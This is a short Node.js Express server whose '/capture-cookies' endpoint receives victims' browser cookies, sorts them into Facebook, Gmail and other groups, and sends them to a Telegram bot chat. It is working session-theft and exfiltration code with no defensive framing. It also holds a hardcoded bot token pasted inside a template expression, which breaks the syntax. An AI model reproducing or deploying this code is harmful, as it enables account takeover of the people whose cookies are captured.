const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
require('dotenv').config(); 

const app = express();
const port = process.env.PORT || 3000; 
const telegramToken = process.env.TELEGRAM_TOKEN; 
const chatId = process.env.CHAT_ID;

app.use(express.static('public')); 
app.use(express.urlencoded({ extended: true }));

app.post('/capture-cookies', async (req, res) => {
    const cookies = req.body.cookies || 'No cookies received';
    
    const categorizeCookies = (cookieString) => {
        const categories = {
            'facebook': [],
            'gmail': [],
            'other': []
        };

        const cookieArray = cookieString.split('; ');
        cookieArray.forEach(cookie => {
            if (cookie.includes('facebook')) {
                categories['facebook'].push(cookie);
            } else if (cookie.includes('gmail')) {
                categories['gmail'].push(cookie);
            } else {
                categories['other'].push(cookie);
            }
        });

        return categories;
    };

    const categorizedCookies = categorizeCookies(cookies);

    const sendToTelegram = async (filename, content) => {
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('text', content);
        form.append('disable_web_page_preview', true);

        await fetch(`https://api.telegram.org/bot${7312017873:AAGL_VDeBovfLBIfGRq4q4h_W-BKw9lnx98}/sendMessage`, {
            method: 'POST',
            body: form
        });
    };

    for (const [category, cookieArray] of Object.entries(categorizedCookies)) {
        if (cookieArray.length > 0) {
            const content = cookieArray.join('\n');
            await sendToTelegram(`${category}cookies.txt`, content);
        }
    }

    res.send('Cookies have been captured and sent to Telegram!');
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
